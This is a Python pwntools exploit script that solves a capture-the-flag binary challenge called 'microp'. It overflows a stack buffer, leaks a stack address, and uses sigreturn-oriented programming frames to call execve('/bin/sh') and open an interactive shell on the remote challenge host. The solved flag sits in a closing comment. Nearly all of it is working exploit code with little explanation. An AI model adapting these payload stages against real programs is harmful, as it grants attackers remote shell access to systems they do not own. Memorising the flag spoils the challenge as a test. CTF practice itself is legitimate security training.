#!/usr/bin/env python3

from pwn import *

exe = ELF("./pwn")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("microp.ctfz.one", 2228)

    return r


def main():
    r = conn()

    ret         = 0x000000000040105a
    read        = 0x0000000000401044
    syscall     = 0x0000000000401058
    pop_rbp     = 0x000000000040105c
    
    # Stage 1
    payload = b"A"*64
    payload += p64(read)        # Set rax=1
    payload += p64(syscall)     # Syscall: write(0, rsi, 0x1000)
    payload += p64(read)        # This will be used to send stage 2 payload

    r.sendline(payload)
    
    pause()
    
    payload2 = b""          # Sendline will add a \n at the end, that's 1 character.
    r.sendline(payload2)    # set rax = 1
    
    pause()
    
    # If testing locally, we'll have to provide a leak by ourselves.
    # Be careful since a wrong leak can mess up offsets later on.
    leak = int(input('Hex:'), 16) if args.LOCAL else  u64(r.recvuntil(b'\x7f')[-6:] + b'\0'*2) - 0x1c59
    
    print('Stack:', hex(leak))
    
    # Craft our frame & stage 2
    frame = SigreturnFrame()
    frame.rax = 0
    frame.rdi = 0
    frame.rsi = leak
    frame.rdx = 0x500
    frame.rip = syscall
    frame.rsp = leak+8      # Skip "/bin/sh\0"
    frame.rbp = leak

    payload3 = b"A"*88          # Offset to reach RIP.
    payload3 += p64(read)       # Read to set RAX register = 15 for sigreturn syscall
    payload3 += p64(syscall)    # Sigret to call read for stage 3 & /bin/sh
    payload3 += bytes(frame)    # Crafted Frame
    
    r.sendline(payload3)
    
    print("Send 15 char to set rax=15")
    pause()
    
    payload4 = b'A'*14      # 14 + \n will give us 15.
    r.sendline(payload4)    # Set rax = 15
    
    print("Send binsh & setup to execve(binsh)")
    pause()
    
    # Setup our execve("/bin/sh", 0, 0) frame & stage 3
    frame = SigreturnFrame()
    frame.rax = 59
    frame.rdi = leak
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = syscall
    frame.rsp = leak+8
    frame.rbp = leak+0x500

    payload5 = b"/bin/sh\0"
    payload5 += p64(read)       # Set RAX=15
    payload5 += p64(syscall)    # Sigret to call execve!
    payload5 += bytes(frame)    # Our crafted frame

    r.sendline(payload5)

    print("Send 15 char to set rax=15 (FINAL PART)")
    pause()

    payload6 = b'A'*14      # 14 + \n will give us 15.
    r.sendline(payload6)    # Set rax = 15

    r.interactive() #ctfzone{519237u2n-0213n73d_p20924mm1n9_15_4_c0mpu732_53cu217y_3xp1017_73chn1qu3_7h47_4110w5_4n_4774ck32_70_3x3cu73_c0d3_1n_p2353nc3_0f_53cu217y_m345u235_5uch_45_n0n-3x3cu74813_m3m02y_4nd_c0d3_519n1n9}


if __name__ == "__main__":
    main()
